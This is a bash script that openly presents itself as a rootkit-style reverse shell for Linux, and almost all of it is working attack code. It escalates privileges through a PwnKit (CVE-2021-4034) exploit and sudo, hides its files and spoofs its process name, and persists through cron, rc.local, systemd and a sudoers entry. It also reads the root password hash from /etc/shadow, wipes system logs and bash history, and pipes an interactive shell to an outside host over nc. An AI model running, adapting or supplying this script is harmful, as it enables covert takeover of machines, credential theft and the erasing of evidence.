#!/bin/bash

# Advanced Rootkit-like Reverse Shell for Linux
# Features: Extreme Hiding, Persistence, Multi-Message Exfiltration, Stable Interactive TTY Shell, PwnKit Exploit, Sudo Elevation, Custom Commands
# WARNING: For educational/lab use only. Illegal on real systems.

# Configuration
ATTACKER_IP="botconnect.ddns.net"  # Replace with your attacker's IP
PORT=4444  # Port for reverse shell and server
HIDDEN_DIR="/var/tmp/.webservice"  # Hidden directory
HIDDEN_FILE="$HIDDEN_DIR/webservice.sh"  # Hidden file
PROCESS_NAME="[webservice]"  # Process name to mimic
LOG_FILES=("/var/log/auth.log" "/var/log/syslog" "/var/log/utmp" "/var/log/wtmp" "$HOME/.bash_history")  # Logs to clean
PERSIST_METHODS=(
    "(crontab -l 2>/dev/null | grep -v $HIDDEN_FILE; echo \"* * * * * /bin/bash $HIDDEN_FILE > /dev/null 2>&1\") | crontab -"
    "[ -f /etc/rc.local ] && echo '/bin/bash $HIDDEN_FILE' >> /etc/rc.local"
    "echo '@reboot /bin/bash $HIDDEN_FILE' | crontab -"
    "mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=/bin/bash $HIDDEN_FILE\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service 2>/dev/null"
)
SUDOERS_FILE="/etc/sudoers.d/webservice"
RETRY_INTERVALS=(1 2 4 8 16 32 64)  # Exponential backoff in seconds
UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "client-$RANDOM-$RANDOM")  # Generate unique client ID

# Function to run PwnKit exploit if not root
run_pwnkit() {
    # PwnKit exploit code (CVE-2021-4034)
    PKEXEC_PATH=$(which pkexec)
    if [ -z "$PKEXEC_PATH" ]; then
        echo "pkexec not found. Falling back to sudo."
        return 1
    fi

    mkdir -p 'GCONV_PATH=.'
    touch 'GCONV_PATH=.'/.ignore
    chmod 0755 'GCONV_PATH=.'/.ignore

    mkdir -p /tmp/pwnkit
    cd /tmp/pwnkit

    cat << EOF > charset
UTF-8
EOF

    cat << EOF > gconv-modules
module UTF-8// PWNKIT_MODULE 2
EOF

    cat << 'EOF' > pwnkit_module.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    setuid(0); setgid(0);
    system("/bin/bash");
    exit(0);
}
EOF

    gcc -fPIC -shared -o pwnkit.so pwnkit_module.c

    export PATH=".:$PATH"
    export CHARSET=/tmp/pwnkit/charset
    export GCONV_PATH=/tmp/pwnkit

    exec "$PKEXEC_PATH"

    if [ $EUID -eq 0 ]; then
        /bin/bash "$0"
        exit 0
    else
        echo "PwnKit exploit failed. Falling back to sudo."
        return 1
    fi
}

# Check and elevate to root if possible
if [ $EUID -ne 0 ]; then
    # Try sudo first
    sudo -n true 2>/dev/null && exec sudo /bin/bash "$0" "$@"
    IS_ADMIN="No"
    # If sudo fails, try PwnKit
    run_pwnkit || {
        echo "Root escalation failed. Running as non-root."
    }
else
    IS_ADMIN="Yes"
fi

# Hide the payload
if [ -d "$HIDDEN_DIR" ]; then
    chattr -i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
fi
mkdir -p "$HIDDEN_DIR"
cp "$0" "$HIDDEN_FILE"
chmod 700 "$HIDDEN_DIR" "$HIDDEN_FILE"
chattr +i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
echo "$PROCESS_NAME" > /proc/self/comm 2>/dev/null  # Hide process name

# Persistence (multiple methods)
for method in "${PERSIST_METHODS[@]}"; do
    eval "$method" &> /dev/null
done

# Add sudoers entry for root elevation on reboot
if [ $EUID -eq 0 ]; then
    echo "$(whoami) ALL=(ALL) NOPASSWD: $HIDDEN_FILE" > "$SUDOERS_FILE"
    chmod 440 "$SUDOERS_FILE"
    chattr +i "$SUDOERS_FILE" 2>/dev/null
fi

# Data Exfiltration
INFO="Hostname: $(hostname)
OS: $(uname -a)
IP: $(ip addr show | grep inet | awk '{print $2}' | paste -sd ',')
Users: $(cat /etc/passwd | cut -d: -f1 | paste -sd ',')
Uptime: $(uptime)
Disk Usage: $(df -h | grep -v tmpfs | grep -v udev)"

# Try root password from /etc/shadow
if [ "$IS_ADMIN" = "Yes" ]; then
    ROOT_PASS=$(grep "^root:" /etc/shadow 2>/dev/null || echo "Not readable")
    INFO="$INFO\nRoot Shadow: $ROOT_PASS"
else
    INFO="$INFO\nNon-root: Shadow not readable. Other Users: $(grep -v root /etc/passwd | cut -d: -f1,6 | paste -sd ',' 2>/dev/null)"
fi

# Clean logs to hide tracks
for log in "${LOG_FILES[@]}"; do
    [ -f "$log" ] && echo "" > "$log" 2>/dev/null
done

# Custom command handler
handle_custom_command() {
    local cmd="$1"
    if [ "$cmd" = "status" ]; then
        echo "Status: Active
Admin: $IS_ADMIN
PID: $$
UUID: $UUID
Uptime: $(uptime)"
    elif [ "$cmd" = "info" ]; then
        echo "$INFO"
    else
        echo "Unknown command: $cmd"
    fi
}

# Heartbeat function
send_heartbeat() {
    while true; do
        sleep 5
        echo "KEEPALIVE:$UUID"
    done
}

# Single connection for messages and shell
while true; do
    (
        echo "MSG:CONN:sono connesso! Admin: $IS_ADMIN UUID: $UUID"
        echo "MSG:INFO:$INFO"
        echo "MSG:STATUS:Payload active, awaiting shell commands"
        echo "MSG:SHELL:START"
        send_heartbeat &
        HEARTBEAT_PID=$!
        while true; do
            read -r cmd
            if [ "$cmd" = "status" ] || [ "$cmd" = "info" ]; then
                handle_custom_command "$cmd"
            else
                /bin/bash -c "$cmd" 2>&1
            fi
        done
        kill $HEARTBEAT_PID 2>/dev/null
    ) | nc -w 120 $ATTACKER_IP $PORT 2>/dev/null
    for interval in "${RETRY_INTERVALS[@]}"; do
        sleep "$interval"
        nc -w 1 $ATTACKER_IP $PORT 2>/dev/null && break
    done
done &

rm -f "$0" 2>/dev/null